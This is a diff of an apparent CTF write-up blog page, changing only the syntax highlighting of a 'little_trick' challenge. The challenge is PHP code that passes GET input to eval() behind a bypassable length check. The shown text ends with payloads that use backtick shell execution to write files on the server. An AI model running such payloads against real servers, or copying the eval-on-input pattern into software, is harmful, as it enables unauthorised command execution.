@@ -200,7 +200,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      270 字
+      263 字
     </span>
   
 
@@ -253,17 +253,17 @@
               </p>
             
             <div class="markdown-body">
-              <h2 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-    error_reporting(<span class="hljs-number">0</span>);
-    highlight_file(<span class="hljs-keyword">__FILE__</span>);
-    $nep = $_GET[<span class="hljs-string">&#x27;nep&#x27;</span>];
-    $len = $_GET[<span class="hljs-string">&#x27;len&#x27;</span>];
-    <span class="hljs-keyword">if</span>(intval($len)&lt;<span class="hljs-number">8</span> &amp;&amp; strlen($nep)&lt;<span class="hljs-number">13</span>)&#123;
-        <span class="hljs-keyword">eval</span>(substr($nep,<span class="hljs-number">0</span>,$len));
-    &#125;<span class="hljs-keyword">else</span>&#123;
-        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;too long!&#x27;</span>);
-    &#125;
-<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
+              <h2 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$nep</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nep'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'too long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span> </code></pre></code></pre>
 <p>长度限制的绕过：      </p>
 <pre><code>nep=`ls&gt;z`;&amp;len=-1     &gt;  写入文件
 nep=`&gt;cat`;&amp;len=-1     &gt;cat  生成一个名为cat的文件  
